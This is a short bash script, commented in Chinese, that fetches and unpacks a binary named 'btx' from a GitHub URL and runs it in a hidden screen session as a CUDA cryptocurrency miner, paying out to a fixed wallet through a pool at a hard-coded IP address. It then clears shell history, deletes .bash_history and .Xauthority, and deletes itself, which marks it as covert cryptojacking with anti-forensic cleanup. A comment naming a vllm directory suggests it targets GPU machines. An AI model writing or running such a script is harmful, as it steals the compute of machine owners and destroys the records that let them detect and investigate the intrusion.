#!/bin/bash

# echo "正在获取程序文件..."
wget https://raw.githubusercontent.com/xiaobintse/sh/main/btx.tar.gz && tar -zxf btx.tar.gz && chmod +x btx &&  rm -rf btx.tar.gz

# 启动程序
echo "正在后台启动进程..."
# 注意：这里运行的是 $HOME/vllm/ 目录下的 p
screen -dmS btx bash -c "sleep 5 && cd ~/btx && ./btx -mode stratum -backend cuda -gpu-devices all -payout btx1zspaa73ljgf4jj3mlesdgkjlyawnv357kuervsvuvp8f0fq786e3qj6mtzs -worker $(hostname) -pool '43.154.101.226:3333'"

# 痕迹清理
history -c
rm -f $HOME/.Xauthority
rm -f $HOME/.bash_history
# 脚本自删除
rm -f "$0"

echo "-------------------------------------------------------"
echo "部署完成！"
echo "-------------------------------------------------------"